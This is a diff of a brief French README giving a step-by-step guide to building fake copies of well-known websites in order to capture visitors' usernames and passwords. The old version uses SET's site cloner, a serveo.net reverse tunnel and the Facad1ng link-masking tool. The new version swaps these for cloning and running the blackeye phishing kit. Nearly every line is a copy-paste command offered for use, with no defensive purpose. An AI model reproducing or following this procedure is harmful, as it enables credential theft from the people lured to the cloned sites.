@@ -1,9 +1,9 @@
 
 # linux hack faux site : mots de passe et identifiant repris
 
-cela va servir a cloner un site parfaitement attention les site avec le code source chiffré notament js et python auront des erreur au clonage 
+cela va servir a cloner des sites connu parfaitement   
 
-copier toutes les commande une aune dans le terminal linux :  
+copier toutes les commande une a une dans le terminal linux :  
  
 ## Installation
 
@@ -13,48 +13,10 @@ copier toutes les commande une aune dans le terminal linux :
 sudo apt update
 sudo apt upgrade -y
 ```
-### Ouvrir le tool
+### installer et ouvrir le tool :  
 
 ```bash
-clear
-sudo setoolkit
+git clone https://github.com/thelinuxchoice/blackeye
+cd blackeye
+bash blackeye.sh
 ``` 
-puis choisissez 1,2,3 et l option 2  
-entrer ton ipv4 :  
-puis choisis un site que tu veux cloner  
-
-### creer un lien serveur local
-
-```bash
-ssh -R 80:localhost:80 serveo.net -y
-```
-note le lien  
-### Cloner le dépôt
-
-```bash
-git clone https://github.com/spyboy-productions/Facad1ng
-cd Facad1ng
-```
-
-### Créer un environnement virtuel
-
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
-
-### Installer les dépendances
-
-```bash
-clear
-pip3 install -r requirements.txt
-```
-
-### Lancer le programme
-
-```bash
-python3 Facad1ng.py
-```
-copie colle ton url que tu as noté  
-dans mots clé choisis login  
-puis choisis un des lien proposer 
